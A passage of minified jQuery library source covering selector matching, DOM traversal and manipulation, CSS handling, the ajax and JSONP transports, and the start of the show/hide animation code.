f=b.call(a,c);if(f||!d||a.document&&a.document.nodeType!==11)return f}}catch(g){}return m(c,null,null,[a]).length>0}}}(),function(){var a=c.createElement("div");a.innerHTML="<div class='test e'></div><div class='test'></div>";if(!!a.getElementsByClassName&&a.getElementsByClassName("e").length!==0){a.lastChild.className="e";if(a.getElementsByClassName("e").length===1)return;o.order.splice(1,0,"CLASS"),o.find.CLASS=function(a,b,c){if(typeof b.getElementsByClassName!="undefined"&&!c)return b.getElementsByClassName(a[1])},a=null}}(),c.documentElement.contains?m.contains=function(a,b){return a!==b&&(a.contains?a.contains(b):!0)}:c.documentElement.compareDocumentPosition?m.contains=function(a,b){return!!(a.compareDocumentPosition(b)&16)}:m.contains=function(){return!1},m.isXML=function(a){var b=(a?a.ownerDocument||a:0).documentElement;return b?b.nodeName!=="HTML":!1};var y=function(a,b,c){var d,e=[],f="",g=b.nodeType?[b]:b;while(d=o.match.PSEUDO.exec(a))f+=d[0],a=a.replace(o.match.PSEUDO,"");a=o.relative[a]?a+"*":a;for(var h=0,i=g.length;h<i;h++)m(a,g[h],e,c);return m.filter(f,e)};m.attr=f.attr,m.selectors.attrMap={},f.find=m,f.expr=m.selectors,f.expr[":"]=f.expr.filters,f.unique=m.uniqueSort,f.text=m.getText,f.isXMLDoc=m.isXML,f.contains=m.contains}();var L=/Until$/,M=/^(?:parents|prevUntil|prevAll)/,N=/,/,O=/^.[^:#\[\.,]*$/,P=Array.prototype.slice,Q=f.expr.match.globalPOS,R={children:!0,contents:!0,next:!0,prev:!0};f.fn.extend({find:function(a){var b=this,c,d;if(typeof a!="string")return f(a).filter(function(){for(c=0,d=b.length;c<d;c++)if(f.contains(b[c],this))return!0});var e=this.pushStack("","find",a),g,h,i;for(c=0,d=this.length;c<d;c++){g=e.length,f.find(a,this[c],e);if(c>0)for(h=g;h<e.length;h++)for(i=0;i<g;i++)if(e[i]===e[h]){e.splice(h--,1);break}}return e},has:function(a){var b=f(a);return this.filter(function(){for(var a=0,c=b.length;a<c;a++)if(f.contains(this,b[a]))return!0})},not:function(a){return this.pushStack(T(this,a,!1),"not",a)},filter:function(a){return this.pushStack(T(this,a,!0),"filter",a)},is:function(a){return!!a&&(typeof a=="string"?Q.test(a)?f(a,this.context).index(this[0])>=0:f.filter(a,this).length>0:this.filter(a).length>0)},closest:function(a,b){var c=[],d,e,g=this[0];if(f.isArray(a)){var h=1;while(g&&g.ownerDocument&&g!==b){for(d=0;d<a.length;d++)f(g).is(a[d])&&c.push({selector:a[d],elem:g,level:h});g=g.parentNode,h++}return c}var i=Q.test(a)||typeof a!="string"?f(a,b||this.context):0;for(d=0,e=this.length;d<e;d++){g=this[d];while(g){if(i?i.index(g)>-1:f.find.matchesSelector(g,a)){c.push(g);break}g=g.parentNode;if(!g||!g.ownerDocument||g===b||g.nodeType===11)break}}c=c.length>1?f.unique(c):c;return this.pushStack(c,"closest",a)},index:function(a){if(!a)return this[0]&&this[0].parentNode?this.prevAll().length:-1;if(typeof a=="string")return f.inArray(this[0],f(a));return f.inArray(a.jquery?a[0]:a,this)},add:function(a,b){var c=typeof a=="string"?f(a,b):f.makeArray(a&&a.nodeType?[a]:a),d=f.merge(this.get(),c);return this.pushStack(S(c[0])||S(d[0])?d:f.unique(d))},andSelf:function(){return this.add(this.prevObject)}}),f.each({parent:function(a){var b=a.parentNode;return b&&b.nodeType!==11?b:null},parents:function(a){return f.dir(a,"parentNode")},parentsUntil:function(a,b,c){return f.dir(a,"parentNode",c)},next:function(a){return f.nth(a,2,"nextSibling")},prev:function(a){return f.nth(a,2,"previousSibling")},nextAll:function(a){return f.dir(a,"nextSibling")},prevAll:function(a){return f.dir(a,"previousSibling")},nextUntil:function(a,b,c){return f.dir(a,"nextSibling",c)},prevUntil:function(a,b,c){return f.dir(a,"previousSibling",c)},siblings:function(a){return f.sibling((a.parentNode||{}).firstChild,a)},children:function(a){return f.sibling(a.firstChild)},contents:function(a){return f.nodeName(a,"iframe")?a.contentDocument||a.contentWindow.document:f.makeArray(a.childNodes)}},function(a,b){f.fn[a]=function(c,d){var e=f.map(this,b,c);L.test(a)||(d=c),d&&typeof d=="string"&&(e=f.filter(d,e)),e=this.length>1&&!R[a]?f.unique(e):e,(this.length>1||N.test(d))&&M.test(a)&&(e=e.reverse());return this.pushStack(e,a,P.call(arguments).join(","))}}),f.extend({filter:function(a,b,c){c&&(a=":not("+a+")");return b.length===1?f.find.matchesSelector(b[0],a)?[b[0]]:[]:f.find.matches(a,b)},dir:function(a,c,d){var e=[],g=a[c];while(g&&g.nodeType!==9&&(d===b||g.nodeType!==1||!f(g).is(d)))g.nodeType===1&&e.push(g),g=g[c];return e},nth:function(a,b,c,d){b=b||1;var e=0;for(;a;a=a[c])if(a.nodeType===1&&++e===b)break;return a},sibling:function(a,b){var c=[];for(;a;a=a.nextSibling)a.nodeType===1&&a!==b&&c.push(a);return c}});var V="abbr|article|aside|audio|bdi|canvas|data|datalist|details|figcaption|figure|footer|header|hgroup|mark|meter|nav|output|progress|section|summary|time|video",W=/ jQuery\d+="(?:\d+|null)"/g,X=/^\s+/,Y=/<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/ig,Z=/<([\w:]+)/,$=/<tbody/i,_=/<|&#?\w+;/,ba=/<(?:script|style)/i,bb=/<(?:script|object|embed|option|style)/i,bc=new RegExp("<(?:"+V+")[\\s/>]","i"),bd=/checked\s*(?:[^=]|=\s*.checked.)/i,be=/\/(java|ecma)script/i,bf=/^\s*<!(?:\[CDATA\[|\-\-)/,bg={option:[1,"<select multiple='multiple'>","</select>"],legend:[1,"<fieldset>","</fieldset>"],thead:[1,"<table>","</table>"],tr:[2,"<table><tbody>","</tbody></table>"],td:[3,"<table><tbody><tr>","</tr></tbody></table>"],col:[2,"<table><tbody></tbody><colgroup>","</colgroup></table>"],area:[1,"<map>","</map>"],_default:[0,"",""]},bh=U(c);bg.optgroup=bg.option,bg.tbody=bg.tfoot=bg.colgroup=bg.caption=bg.thead,bg.th=bg.td,f.support.htmlSerialize||(bg._default=[1,"div<div>","</div>"]),f.fn.extend({text:function(a){return f.access(this,function(a){return a===b?f.text(this):this.empty().append((this[0]&&this[0].ownerDocument||c).createTextNode(a))},null,a,arguments.length)},wrapAll:function(a){if(f.isFunction(a))return this.each(function(b){f(this).wrapAll(a.call(this,b))});if(this[0]){var b=f(a,this[0].ownerDocument).eq(0).clone(!0);this[0].parentNode&&b.insertBefore(this[0]),b.map(function(){var a=this;while(a.firstChild&&a.firstChild.nodeType===1)a=a.firstChild;return a}).append(this)}return this},wrapInner:function(a){if(f.isFunction(a))return this.each(function(b){f(this).wrapInner(a.call(this,b))});return this.each(function(){var b=f(this),c=b.contents();c.length?c.wrapAll(a):b.append(a)})},wrap:function(a){var b=f.isFunction(a);return this.each(function(c){f(this).wrapAll(b?a.call(this,c):a)})},unwrap:function(){return this.parent().each(function(){f.nodeName(this,"body")||f(this).replaceWith(this.childNodes)}).end()},append:function(){return this.domManip(arguments,!0,function(a){this.nodeType===1&&this.appendChild(a)})},prepend:function(){return this.domManip(arguments,!0,function(a){this.nodeType===1&&this.insertBefore(a,this.firstChild)})},before:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,!1,function(a){this.parentNode.insertBefore(a,this)});if(arguments.length){var a=f
			.clean(arguments);a.push.apply(a,this.toArray());return this.pushStack(a,"before",arguments)}},after:function(){if(this[0]&&this[0].parentNode)return this.domManip(arguments,!1,function(a){this.parentNode.insertBefore(a,this.nextSibling)});if(arguments.length){var a=this.pushStack(this,"after",arguments);a.push.apply(a,f.clean(arguments));return a}},remove:function(a,b){for(var c=0,d;(d=this[c])!=null;c++)if(!a||f.filter(a,[d]).length)!b&&d.nodeType===1&&(f.cleanData(d.getElementsByTagName("*")),f.cleanData([d])),d.parentNode&&d.parentNode.removeChild(d);return this},empty:function(){for(var a=0,b;(b=this[a])!=null;a++){b.nodeType===1&&f.cleanData(b.getElementsByTagName("*"));while(b.firstChild)b.removeChild(b.firstChild)}return this},clone:function(a,b){a=a==null?!1:a,b=b==null?a:b;return this.map(function(){return f.clone(this,a,b)})},html:function(a){return f.access(this,function(a){var c=this[0]||{},d=0,e=this.length;if(a===b)return c.nodeType===1?c.innerHTML.replace(W,""):null;if(typeof a=="string"&&!ba.test(a)&&(f.support.leadingWhitespace||!X.test(a))&&!bg[(Z.exec(a)||["",""])[1].toLowerCase()]){a=a.replace(Y,"<$1></$2>");try{for(;d<e;d++)c=this[d]||{},c.nodeType===1&&(f.cleanData(c.getElementsByTagName("*")),c.innerHTML=a);c=0}catch(g){}}c&&this.empty().append(a)},null,a,arguments.length)},replaceWith:function(a){if(this[0]&&this[0].parentNode){if(f.isFunction(a))return this.each(function(b){var c=f(this),d=c.html();c.replaceWith(a.call(this,b,d))});typeof a!="string"&&(a=f(a).detach());return this.each(function(){var b=this.nextSibling,c=this.parentNode;f(this).remove(),b?f(b).before(a):f(c).append(a)})}return this.length?this.pushStack(f(f.isFunction(a)?a():a),"replaceWith",a):this},detach:function(a){return this.remove(a,!0)},domManip:function(a,c,d){var e,g,h,i,j=a[0],k=[];if(!f.support.checkClone&&arguments.length===3&&typeof j=="string"&&bd.test(j))return this.each(function(){f(this).domManip(a,c,d,!0)});if(f.isFunction(j))return this.each(function(e){var g=f(this);a[0]=j.call(this,e,c?g.html():b),g.domManip(a,c,d)});if(this[0]){i=j&&j.parentNode,f.support.parentNode&&i&&i.nodeType===11&&i.childNodes.length===this.length?e={fragment:i}:e=f.buildFragment(a,this,k),h=e.fragment,h.childNodes.length===1?g=h=h.firstChild:g=h.firstChild;if(g){c=c&&f.nodeName(g,"tr");for(var l=0,m=this.length,n=m-1;l<m;l++)d.call(c?bi(this[l],g):this[l],e.cacheable||m>1&&l<n?f.clone(h,!0,!0):h)}k.length&&f.each(k,function(a,b){b.src?f.ajax({type:"GET",global:!1,url:b.src,async:!1,dataType:"script"}):f.globalEval((b.text||b.textContent||b.innerHTML||"").replace(bf,"/*$0*/")),b.parentNode&&b.parentNode.removeChild(b)})}return this}}),f.buildFragment=function(a,b,d){var e,g,h,i,j=a[0];b&&b[0]&&(i=b[0].ownerDocument||b[0]),i.createDocumentFragment||(i=c),a.length===1&&typeof j=="string"&&j.length<512&&i===c&&j.charAt(0)==="<"&&!bb.test(j)&&(f.support.checkClone||!bd.test(j))&&(f.support.html5Clone||!bc.test(j))&&(g=!0,h=f.fragments[j],h&&h!==1&&(e=h)),e||(e=i.createDocumentFragment(),f.clean(a,i,e,d)),g&&(f.fragments[j]=h?e:1);return{fragment:e,cacheable:g}},f.fragments={},f.each({appendTo:"append",prependTo:"prepend",insertBefore:"before",insertAfter:"after",replaceAll:"replaceWith"},function(a,b){f.fn[a]=function(c){var d=[],e=f(c),g=this.length===1&&this[0].parentNode;if(g&&g.nodeType===11&&g.childNodes.length===1&&e.length===1){e[b](this[0]);return this}for(var h=0,i=e.length;h<i;h++){var j=(h>0?this.clone(!0):this).get();f(e[h])[b](j),d=d.concat(j)}return this.pushStack(d,a,e.selector)}}),f.extend({clone:function(a,b,c){var d,e,g,h=f.support.html5Clone||f.isXMLDoc(a)||!bc.test("<"+a.nodeName+">")?a.cloneNode(!0):bo(a);if((!f.support.noCloneEvent||!f.support.noCloneChecked)&&(a.nodeType===1||a.nodeType===11)&&!f.isXMLDoc(a)){bk(a,h),d=bl(a),e=bl(h);for(g=0;d[g];++g)e[g]&&bk(d[g],e[g])}if(b){bj(a,h);if(c){d=bl(a),e=bl(h);for(g=0;d[g];++g)bj(d[g],e[g])}}d=e=null;return h},clean:function(a,b,d,e){var g,h,i,j=[];b=b||c,typeof b.createElement=="undefined"&&(b=b.ownerDocument||b[0]&&b[0].ownerDocument||c);for(var k=0,l;(l=a[k])!=null;k++){typeof l=="number"&&(l+="");if(!l)continue;if(typeof l=="string")if(!_.test(l))l=b.createTextNode(l);else{l=l.replace(Y,"<$1></$2>");var m=(Z.exec(l)||["",""])[1].toLowerCase(),n=bg[m]||bg._default,o=n[0],p=b.createElement("div"),q=bh.childNodes,r;b===c?bh.appendChild(p):U(b).appendChild(p),p.innerHTML=n[1]+l+n[2];while(o--)p=p.lastChild;if(!f.support.tbody){var s=$.test(l),t=m==="table"&&!s?p.firstChild&&p.firstChild.childNodes:n[1]==="<table>"&&!s?p.childNodes:[];for(i=t.length-1;i>=0;--i)f.nodeName(t[i],"tbody")&&!t[i].childNodes.length&&t[i].parentNode.removeChild(t[i])}!f.support.leadingWhitespace&&X.test(l)&&p.insertBefore(b.createTextNode(X.exec(l)[0]),p.firstChild),l=p.childNodes,p&&(p.parentNode.removeChild(p),q.length>0&&(r=q[q.length-1],r&&r.parentNode&&r.parentNode.removeChild(r)))}var u;if(!f.support.appendChecked)if(l[0]&&typeof (u=l.length)=="number")for(i=0;i<u;i++)bn(l[i]);else bn(l);l.nodeType?j.push(l):j=f.merge(j,l)}if(d){g=function(a){return!a.type||be.test(a.type)};for(k=0;j[k];k++){h=j[k];if(e&&f.nodeName(h,"script")&&(!h.type||be.test(h.type)))e.push(h.parentNode?h.parentNode.removeChild(h):h);else{if(h.nodeType===1){var v=f.grep(h.getElementsByTagName("script"),g);j.splice.apply(j,[k+1,0].concat(v))}d.appendChild(h)}}}return j},cleanData:function(a){var b,c,d=f.cache,e=f.event.special,g=f.support.deleteExpando;for(var h=0,i;(i=a[h])!=null;h++){if(i.nodeName&&f.noData[i.nodeName.toLowerCase()])continue;c=i[f.expando];if(c){b=d[c];if(b&&b.events){for(var j in b.events)e[j]?f.event.remove(i,j):f.removeEvent(i,j,b.handle);b.handle&&(b.handle.elem=null)}g?delete i[f.expando]:i.removeAttribute&&i.removeAttribute(f.expando),delete d[c]}}}});var bp=/alpha\([^)]*\)/i,bq=/opacity=([^)]*)/,br=/([A-Z]|^ms)/g,bs=/^[\-+]?(?:\d*\.)?\d+$/i,bt=/^-?(?:\d*\.)?\d+(?!px)[^\d\s]+$/i,bu=/^([\-+])=([\-+.\de]+)/,bv=/^margin/,bw={position:"absolute",visibility:"hidden",display:"block"},bx=["Top","Right","Bottom","Left"],by,bz,bA;f.fn.css=function(a,c){return f.access(this,function(a,c,d){return d!==b?f.style(a,c,d):f.css(a,c)},a,c,arguments.length>1)},f.extend({cssHooks:{opacity:{get:function(a,b){if(b){var c=by(a,"opacity");return c===""?"1":c}return a.style.opacity}}},cssNumber:{fillOpacity:!0,fontWeight:!0,lineHeight:!0,opacity:!0,orphans:!0,widows:!0,zIndex:!0,zoom:!0},cssProps:{"float":f.support.cssFloat?"cssFloat":"styleFloat"},style:function(a,c,d,e){if(!!a&&a.nodeType!==3&&a.nodeType!==8&&!!a.style){var g,h,i=f.camelCase(c),j=a.style,k=f.cssHooks[i];c=f.cssProps[i]||i;if(d===b){if(k&&"get"in k&&(g=k.get(a,!1,e))!==b)return g;return j[c]}h=typeof d,h==="string"&&(g=bu.exec(d))&&(d=+(g[1]+1)*+g[2]+parseFloat(f.css(a,c)),h="number");if(d==null||h==="number"&&isNaN(d))return;h==="number"&&!f.cssNumber[i]&&(d+="px");if(!k||!("set"in k)||(d=k.set(a,d))!==b)try{j[c]=d}catch(l){}}},css:function(a,c,d){var e,g;c=f.camelCase(c),g=f.cssHooks[c],c=f.cssProps[c]||c,c==="cssFloat"&&(c="float");if(g&&"get"in g&&(e=g.get(a,!0,d))!==b)return e;if(by)return by(a,c)},swap:function(a,b,c){var d={},e,f;for(f in b)d[f]=a.style[f],a.style[f]=b[f];e=c.call(a);for(f in b)a.style[f]=d[f];return e}}),f.curCSS=f.css,c.defaultView&&c.defaultView.getComputedStyle&&(bz=function(a,b){var c,d,e,g,h=a.style;b=b.replace(br,"-$1").toLowerCase(),(d=a.ownerDocument.defaultView)&&(e=d.getComputedStyle(a,null))&&(c=e.getPropertyValue(b),c===""&&!f.contains(a.ownerDocument.documentElement,a)&&(c=f.style(a,b))),!f.support.pixelMargin&&e&&bv.test(b)&&bt.test(c)&&(g=h.width,h.width=c,c=e.width,h.width=g);return c}),c.documentElement.currentStyle&&(bA=function(a,b){var c,d,e,f=a.currentStyle&&a.currentStyle[b],g=a.style;f==null&&g&&(e=g[b])&&(f=e),bt.test(f)&&(c=g.left,d=a.runtimeStyle&&a.runtimeStyle.left,d&&(a.runtimeStyle.left=a.currentStyle.left),g.left=b==="fontSize"?"1em":f,f=g.pixelLeft+"px",g.left=c,d&&(a.runtimeStyle.left=d));return f===""?"auto":f}),by=bz||bA,f.each(["height","width"],function(a,b){f.cssHooks[b]={get:function(a,c,d){if(c)return a.offsetWidth!==0?bB(a,b,d):f.swap(a,bw,function(){return bB(a,b,d)})},set:function(a,b){return bs.test(b)?b+"px":b}}}),f.support.opacity||(f.cssHooks.opacity={get:function(a,b){return bq.test((b&&a.currentStyle?a.currentStyle.filter:a.style.filter)||"")?parseFloat(RegExp.$1)/100+"":b?"1":""},set:function(a,b){var c=a.style,d=a.currentStyle,e=f.isNumeric(b)?"alpha(opacity="+b*100+")":"",g=d&&d.filter||c.filter||"";c.zoom=1;if(b>=1&&f.trim(g.replace(bp,""))===""){c.removeAttribute("filter");if(d&&!d.filter)return}c.filter=bp.test(g)?g.replace(bp,e):g+" "+e}}),f(function(){f.support.reliableMarginRight||(f.cssHooks.marginRight={get:function(a,b){return f.swap(a,{display:"inline-block"},function(){return b?by(a,"margin-right"):a.style.marginRight})}})}),f.expr&&f.expr.filters&&(f.expr.filters.hidden=function(a){var b=a.offsetWidth,c=a.offsetHeight;return b===0&&c===0||!f.support.reliableHiddenOffsets&&(a.style&&a.style.display||f.css(a,"display"))==="none"},f.expr.filters.visible=function(a){return!f.expr.filters.hidden(a)}),f.each({margin:"",padding:"",border:"Width"},function(a,b){f.cssHooks[a+b]={expand:function(c){var d,e=typeof c=="string"?c.split(" "):[c],f={};for(d=0;d<4;d++)f[a+bx[d]+b]=e[d]||e[d-2]||e[0];return f}}});var bC=/%20/g,bD=/\[\]$/,bE=/\r?\n/g,bF=/#.*$/,bG=/^(.*?):[ \t]*([^\r\n]*)\r?$/mg,bH=/^(?:color|date|datetime|datetime-local|email|hidden|month|number|password|range|search|tel|text|time|url|week)$/i,bI=/^(?:about|app|app\-storage|.+\-extension|file|res|widget):$/,bJ=/^(?:GET|HEAD)$/,bK=/^\/\//,bL=/\?/,bM=/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi,bN=/^(?:select|textarea)/i,bO=/\s+/,bP=/([?&])_=[^&]*/,bQ=/^([\w\+\.\-]+:)(?:\/\/([^\/?#:]*)(?::(\d+))?)?/,bR=f.fn.load,bS={},bT={},bU,bV,bW=["*/"]+["*"];try{bU=e.href}catch(bX){bU=c.createElement("a"),bU.href="",bU=bU.href}bV=bQ.exec(bU.toLowerCase())||[],f.fn.extend({load:function(a,c,d){if(typeof a!="string"&&bR)return bR.apply(this,arguments);if(!this.length)return this;var e=a.indexOf(" ");if(e>=0){var g=a.slice(e,a.length);a=a.slice(0,e)}var h="GET";c&&(f.isFunction(c)?(d=c,c=b):typeof c=="object"&&(c=f.param(c,f.ajaxSettings.traditional),h="POST"));var i=this;f.ajax({url:a,type:h,dataType:"html",data:c,complete:function(a,b,c){c=a.responseText,a.isResolved()&&(a.done(function(a){c=a}),i.html(g?f("<div>").append(c.replace(bM,"")).find(g):c)),d&&i.each(d,[c,b,a])}});return this},serialize:function(){return f.param(this.serializeArray())},serializeArray:function(){return this.map(function(){return this.elements?f.makeArray(this.elements):this}).filter(function(){return this.name&&!this.disabled&&(this.checked||bN.test(this.nodeName)||bH.test(this.type))}).map(function(a,b){var c=f(this).val();return c==null?null:f.isArray(c)?f.map(c,function(a,c){return{name:b.name,value:a.replace(bE,"\r\n")}}):{name:b.name,value:c.replace(bE,"\r\n")}}).get()}}),f.each("ajaxStart ajaxStop ajaxComplete ajaxError ajaxSuccess ajaxSend".split(" "),function(a,b){f.fn[b]=function(a){return this.on(b,a)}}),f.each(["get","post"],function(a,c){f[c]=function(a,d,e,g){f.isFunction(d)&&(g=g||e,e=d,d=b);return f.ajax({type:c,url:a,data:d,success:e,dataType:g})}}),f.extend({getScript:function(a,c){return f.get(a,b,c,"script")},getJSON:function(a,b,c){return f.get(a,b,c,"json")},ajaxSetup:function(a,b){b?b$(a,f.ajaxSettings):(b=a,a=f.ajaxSettings),b$(a,b);return a},ajaxSettings:{url:bU,isLocal:bI.test(bV[1]),global:!0,type:"GET",contentType:"application/x-www-form-urlencoded; charset=UTF-8",processData:!0,async:!0,accepts:{xml:"application/xml, text/xml",html:"text/html",text:"text/plain",json:"application/json, text/javascript","*":bW},contents:{xml:/xml/,html:/html/,json:/json/},responseFields:{xml:"responseXML",text:"responseText"},converters:{"* text":a.String,"text html":!0,"text json":f.parseJSON,"text xml":f.parseXML},flatOptions:{context:!0,url:!0}},ajaxPrefilter:bY(bS),ajaxTransport:bY(bT),ajax:function(a,c){function w(a,c,l,m){if(s!==2){s=2,q&&clearTimeout(q),p=b,n=m||"",v.readyState=a>0?4:0;var o,r,u,w=c,x=l?ca(d,v,l):b,y,z;if(a>=200&&a<300||a===304){if(d.ifModified){if(y=v.getResponseHeader("Last-Modified"))f.lastModified[k]=y;if(z=v.getResponseHeader("Etag"))f.etag[k]=z}if(a===304)w="notmodified",o=!0;else try{r=cb(d,x),w="success",o=!0}catch(A){w="parsererror",u=A}}else{u=w;if(!w||a)w="error",a<0&&(a=0)}v.status=a,v.statusText=""+(c||w),o?h.resolveWith(e,[r,w,v]):h.rejectWith(e,[v,w,u]),v.statusCode(j),j=b,t&&g.trigger("ajax"+(o?"Success":"Error"),[v,d,o?r:u]),i.fireWith(e,[v,w]),t&&(g.trigger("ajaxComplete",[v,d]),--f.active||f.event.trigger("ajaxStop"))}}typeof a=="object"&&(c=a,a=b),c=c||{};var d=f.ajaxSetup({},c),e=d.context||d,g=e!==d&&(e.nodeType||e instanceof f)?f(e):f.event,h=f.Deferred(),i=f.Callbacks("once memory"),j=d.statusCode||{},k,l={},m={},n,o,p,q,r,s=0,t,u,v={readyState:0,setRequestHeader:function(a,b){if(!s){var c=a.toLowerCase();a=m[c]=m[c]||a,l[a]=b}return this},getAllResponseHeaders:function(){return s===2?n:null},getResponseHeader:function(a){var c;if(s===2){if(!o){o={};while(c=bG.exec(n))o[c[1].toLowerCase()]=c[2]}c=o[a.toLowerCase()]}return c===b?null:c},overrideMimeType:function(a){s||(d.mimeType=a);return this},abort:function(a){a=a||"abort",p&&p.abort(a),w(0,a);return this}};h.promise(v),v.success=v.done,v.error=v.fail,v.complete=i.add,v.statusCode=function(a){if(a){var b;if(s<2)for(b in a)j[b]=[j[b],a[b]];else b=a[v.status],v.then(b,b)}return this},d.url=((a||d.url)+"").replace(bF,"").replace(bK,bV[1]+"//"),d.dataTypes=f.trim(d.dataType||"*").toLowerCase().split(bO),d.crossDomain==null&&(r=bQ.exec(d.url.toLowerCase()),d.crossDomain=!(!r||r[1]==bV[1]&&r[2]==bV[2]&&(r[3]||(r[1]==="http:"?80:443))==(bV[3]||(bV[1]==="http:"?80:443)))),d.data&&d.processData&&typeof d.data!="string"&&(d.data=f.param(d.data,d.traditional)),bZ(bS,d,c,v);if(s===2)return!1;t=d.global,d.type=d.type.toUpperCase(),d.hasContent=!bJ.test(d.type),t&&f.active++===0&&f.event.trigger("ajaxStart");if(!d.hasContent){d.data&&(d.url+=(bL.test(d.url)?"&":"?")+d.data,delete d.data),k=d.url;if(d.cache===!1){var x=f.now(),y=d.url.replace(bP,"$1_="+x);d.url=y+(y===d.url?(bL.test(d.url)?"&":"?")+"_="+x:"")}}(d.data&&d.hasContent&&d.contentType!==!1||c.contentType)&&v.setRequestHeader("Content-Type",d.contentType),d.ifModified&&(k=k||d.url,f.lastModified[k]&&v.setRequestHeader("If-Modified-Since",f.lastModified[k]),f.etag[k]&&v.setRequestHeader("If-None-Match",f.etag[k])),v.setRequestHeader("Accept",d.dataTypes[0]&&d.accepts[d.dataTypes[0]]?d.accepts[d.dataTypes[0]]+(d.dataTypes[0]!=="*"?", "+bW+"; q=0.01":""):d.accepts["*"]);for(u in d.headers)v.setRequestHeader(u,d.headers[u]);if(d.beforeSend&&(d.beforeSend.call(e,v,d)===!1||s===2)){v.abort();return!1}for(u in{success:1,error:1,complete:1})v[u](d[u]);p=bZ(bT,d,c,v);if(!p)w(-1,"No Transport");else{v.readyState=1,t&&g.trigger("ajaxSend",[v,d]),d.async&&d.timeout>0&&(q=setTimeout(function(){v.abort("timeout")},d.timeout));try{s=1,p.send(l,w)}catch(z){if(s<2)w(-1,z);else throw z}}return v},param:function(a,c){var d=[],e=function(a,b){b=f.isFunction(b)?b():b,d[d.length]=encodeURIComponent(a)+"="+encodeURIComponent(b)};c===b&&(c=f.ajaxSettings.traditional);if(f.isArray(a)||a.jquery&&!f.isPlainObject(a))f.each(a,function(){e(this.name,this.value)});else for(var g in a)b_(g,a[g],c,e);return d.join("&").replace(bC,"+")}}),f.extend({active:0,lastModified:{},etag:{}});var cc=f.now(),cd=/(\=)\?(&|$)|\?\?/i;f.ajaxSetup({jsonp:"callback",jsonpCallback:function(){return f.expando+"_"+cc++}}),f.ajaxPrefilter("json jsonp",function(b,c,d){var e=typeof b.data=="string"&&/^application\/x\-www\-form\-urlencoded/.test(b.contentType);if(b.dataTypes[0]==="jsonp"||b.jsonp!==!1&&(cd.test(b.url)||e&&cd.test(b.data))){var g,h=b.jsonpCallback=f.isFunction(b.jsonpCallback)?b.jsonpCallback():b.jsonpCallback,i=a[h],j=b.url,k=b.data,l="$1"+h+"$2";b.jsonp!==!1&&(j=j.replace(cd,l),b.url===j&&(e&&(k=k.replace(cd,l)),b.data===k&&(j+=(/\?/.test(j)?"&":"?")+b.jsonp+"="+h))),b.url=j,b.data=k,a[h]=function(a){g=[a]},d.always(function(){a[h]=i,g&&f.isFunction(i)&&a[h](g[0])}),b.converters["script json"]=function(){g||f.error(h+" was not called");return g[0]},b.dataTypes[0]="json";return"script"}}),f.ajaxSetup({accepts:{script:"text/javascript, application/javascript, application/ecmascript, application/x-ecmascript"},contents:{script:/javascript|ecmascript/},converters:{"text script":function(a){f.globalEval(a);return a}}}),f.ajaxPrefilter("script",function(a){a.cache===b&&(a.cache=!1),a.crossDomain&&(a.type="GET",a.global=!1)}),f.ajaxTransport("script",function(a){if(a.crossDomain){var d,e=c.head||c.getElementsByTagName("head")[0]||c.documentElement;return{send:function(f,g){d=c.createElement("script"),d.async="async",a.scriptCharset&&(d.charset=a.scriptCharset),d.src=a.url,d.onload=d.onreadystatechange=function(a,c){if(c||!d.readyState||/loaded|complete/.test(d.readyState))d.onload=d.onreadystatechange=null,e&&d.parentNode&&e.removeChild(d),d=b,c||g(200,"success")},e.insertBefore(d,e.firstChild)},abort:function(){d&&d.onload(0,1)}}}});var ce=a.ActiveXObject?function(){for(var a in cg)cg[a](0,1)}:!1,cf=0,cg;f.ajaxSettings.xhr=a.ActiveXObject?function(){return!this.isLocal&&ch()||ci()}:ch,function(a){f.extend(f.support,{ajax:!!a,cors:!!a&&"withCredentials"in a})}(f.ajaxSettings.xhr()),f.support.ajax&&f.ajaxTransport(function(c){if(!c.crossDomain||f.support.cors){var d;return{send:function(e,g){var h=c.xhr(),i,j;c.username?h.open(c.type,c.url,c.async,c.username,c.password):h.open(c.type,c.url,c.async);if(c.xhrFields)for(j in c.xhrFields)h[j]=c.xhrFields[j];c.mimeType&&h.overrideMimeType&&h.overrideMimeType(c.mimeType),!c.crossDomain&&!e["X-Requested-With"]&&(e["X-Requested-With"]="XMLHttpRequest");try{for(j in e)h.setRequestHeader(j,e[j])}catch(k){}h.send(c.hasContent&&c.data||null),d=function(a,e){var j,k,l,m,n;try{if(d&&(e||h.readyState===4)){d=b,i&&(h.onreadystatechange=f.noop,ce&&delete cg[i]);if(e)h.readyState!==4&&h.abort();else{j=h.status,l=h.getAllResponseHeaders(),m={},n=h.responseXML,n&&n.documentElement&&(m.xml=n);try{m.text=h.responseText}catch(a){}try{k=h.statusText}catch(o){k=""}!j&&c.isLocal&&!c.crossDomain?j=m.text?200:404:j===1223&&(j=204)}}}catch(p){e||g(-1,p)}m&&g(j,k,m,l)},!c.async||h.readyState===4?d():(i=++cf,ce&&(cg||(cg={},f(a).unload(ce)),cg[i]=d),h.onreadystatechange=d)},abort:function(){d&&d(0,1)}}}});var cj={},ck,cl,cm=/^(?:toggle|show|hide)$/,cn=/^([+\-]=)?([\d+.\-]+)([a-z%]*)$/i,co,cp=[["height","marginTop","marginBottom","paddingTop","paddingBottom"],["width","marginLeft","marginRight","paddingLeft","paddingRight"],["opacity"]],cq;f.fn.extend({show:function(a,b,c){var d,e;if(a||a===0)return this.animate(ct("show",3),a,b,c);for(var g=0,h=this.length;g<h;g++)d=this[g],d.style&&(e=d.style.display,!f._data(d,"olddisplay")&&e==="none"&&(e=d.style.display=""),(e===""&&f.css(d,"display")==="none"||!f.contains(d.ownerDocument.documentElement,d))&&f._data(d,"olddisplay",cu(d.nodeName)));for(g=0;g<h;g++){d=this[g];if(d.style){e=d.style.display;if(e===""||e==="none")d.style.display=f._data(d,"olddisplay")||""}}return this},hide:function(a,b,c){if(a||a===0)return this.animate(ct("hide",3),a,b,c);var d,e,g=0,h=this.length;for(;g<h;g++)d=this[g],d.style&&(e=f.css(d,"display"),e!=="none"&&!f._data(d,"olddisplay")&&f._data(d,"olddisplay",e));for(g=0;g<h;g++)this[g].style&&(this[g].style.display="none");return this},_toggle:f.fn.toggle,toggle:function(a,b,c){var d=typeof a=="boolean";f.isFunction(a)&&f.isFunction(b)?this._toggle.apply(this,arguments):a==null||d?this.each(function(){var 